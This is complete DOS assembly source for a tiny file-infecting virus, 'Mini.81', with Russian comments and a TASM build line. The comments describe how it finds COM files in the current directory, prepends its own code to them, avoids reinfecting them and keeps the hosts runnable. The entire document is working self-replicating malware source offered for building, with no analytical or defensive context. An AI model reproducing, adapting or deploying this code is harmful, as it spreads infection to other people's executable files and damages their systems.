; Серия Mini (c) by RedArc

; Mini.81 (c) CrkV

;■ поиск и инфицирование COM-файлов в текущем каталоге
;■ инфицирование в начало
;■ оставляет программы работоспособными
;■ не заражает повторно уже инфицированные программы
;■ портит DTA
;■ не резидентный

;■ портит начальные значения регистров

;use tasm mini_81 /m2

Model Tiny
.code
org 100h
start:
	Add	Dh,10h
	Mov	Es,Dx			;+1000h весь сегмент программы

	Mov	Ch,0FFh			;Cx:=FFFFh

	Mov	Di,Si

	Push	Es Di

	Mov	Si,VirLength+100h
	Repe	MovSB
	MovSB				;Si:=VirLength+100h, Di:=100h

	Mov	Ah,26h			;Копируем PSP
	Int	21h
	
	Mov	Dx,Offset FileName
	Mov	Ah,4Eh
@0:
	Int	21h
	Jnc	@1
	RetF
@1:
	Mov	Ax,3D02h
	Mov	Dx,9Eh
	Int	21h
	Xchg	Bx,Ax
	Mov	Ah,3Fh
	Mov	Dx,Si
	Mov	Cx,Sp
	Int	21h
	Cmp	Byte Ptr [Si],80h
	Je	@2
	Add	Ax,Virlength
	Push	Ax
	Sub	Cx,Cx
	Mul	Cx
	Mov	Ah,42h
	Int	21h
	Pop	Cx
	Mov	Ah,40h
	Pop	Dx
	Push	Dx
	Int	21h
@2:	Mov	Ah,4Fh
	Jmp	Short @0

FileName db '*.c*', 0h
VirLength equ $-start
	Ret
end start
